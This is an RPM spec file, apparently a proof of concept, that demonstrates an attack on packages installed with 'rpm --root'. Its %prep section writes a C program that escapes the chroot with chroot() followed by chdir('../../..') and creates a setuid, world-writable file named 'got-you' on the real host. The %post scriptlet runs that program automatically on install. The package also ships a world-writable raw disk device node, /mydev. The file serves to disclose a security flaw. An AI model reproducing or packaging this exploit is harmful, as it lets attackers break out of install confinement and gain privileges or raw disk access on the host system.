Summary:	Demonstrates attacks against 'rpm --root ...' operations
Name:		chroot-attack
Version:	0.1
Release:	1
Epoch:		0
License:	GPL
Group:		Applications/System
BuildRoot:	%_tmppath/%name-%version-%release-root
BuildRequires:	dietlibc

%description

%prep
%setup -q -c -T

cat <<EOF >chroot-attack.c
#include <fcntl.h>
int main() {
	chdir("/");
	chroot("%_bindir");
	chdir("../../..");
	umask(0);
	open("got-you", O_CREAT|O_WRONLY, 04777);
	return 0;
}
EOF

%build
diet -Os %__cc $RPM_OPT_FLAGS chroot-attack.c -o chroot-attack

%install
rm -rf $RPM_BUILD_ROOT
%__install -D -m0755 chroot-attack $RPM_BUILD_ROOT%_bindir/chroot-attack

%clean
rm -rf $RPM_BUILD_ROOT


%post -p %_bindir/chroot-attack

%files
%defattr(-,root,root,-)
%_bindir/*
%attr(0777, root,root) %dev(c, 3, 0) /mydev
